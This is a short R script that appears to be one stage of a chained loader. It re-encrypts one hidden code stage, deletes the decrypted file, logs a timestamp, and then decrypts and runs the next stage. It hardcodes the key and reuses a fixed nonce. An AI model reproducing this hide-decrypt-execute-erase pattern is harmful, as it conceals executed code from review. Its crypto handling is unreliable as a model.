#remove environment variables
rm(list=ls())

#declare variables 
filesourcepath <- paste(getwd(), "/initializer2hidden.txt", sep = "") 
filepath <-  paste(getwd(), "/initializer2.txt", sep = "") 

#declare key and nonce for initializer two
nonce <- charToRaw(substring("A nonce of length twenty four", 1,24))
key <- hash(charToRaw(toString(as.character("this is a key"), width = NULL )))

#execute function encrypt for initializer two code which was decrypted from initializer1.R
encrypt(filesourcepath, filepath, key, nonce, noncechar)

#remove the initializer two decrypted code from disk 
file.remove(filesourcepath)

#text file to save on disk with timestamp for confirmaiton that code execution completed
write(format(Sys.time()+180, " %d %b %X "), paste(getwd(), "/initializer2log.txt", sep = ""))

#declare variables 
filepath <- paste(getwd(), "/initializer3.txt", sep = "" ) 
filesourcepath <- paste(getwd(), "/initializer3hidden.txt", sep = "") 

#declare key and nonce for initializer three
nonce <- charToRaw(substring("A nonce of length twenty four", 1,24))
key <- hash(charToRaw(toString(as.character("this is a key"), width = NULL )))

#execute function decryptandrun for initializer three 
decryptandrun(filepath, filesourcepath, key, nonce)





